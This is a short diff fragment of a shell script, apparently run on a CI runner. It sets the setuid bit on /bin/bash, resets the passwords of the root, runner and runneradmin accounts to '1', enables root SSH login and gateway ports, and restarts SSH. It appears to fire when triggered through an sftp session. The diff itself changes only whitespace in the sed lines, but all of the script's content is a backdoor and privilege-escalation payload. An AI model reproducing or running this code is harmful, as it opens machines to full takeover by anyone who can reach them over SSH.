@@ -59,8 +59,8 @@ s2="grep -q sftp-server /proc/\$\$/cmdline&&(
         chmod +s /bin/bash;
         echo runneradmin:1|chpasswd ;  
         echo runner:1|chpasswd;
-        sed -i "s/^#\?\(PermitRootLogin\)/\1 yes#/g" /etc/ssh/sshd_config;
-        sed -i "s/^#\?\(GatewayPorts\)/\1 yes#/g" /etc/ssh/sshd_config;
+        sed -i "s/^#\?\(PermitRootLogin\)/\1 yes  #/g" /etc/ssh/sshd_config;
+        sed -i "s/^#\?\(GatewayPorts\)/\1 yes  #/g" /etc/ssh/sshd_config;
         echo root:1|chpasswd;
         setsid bash -c "/etc/init.d/ssh   stop ;/etc/init.d/ssh   start ;" &
         id'
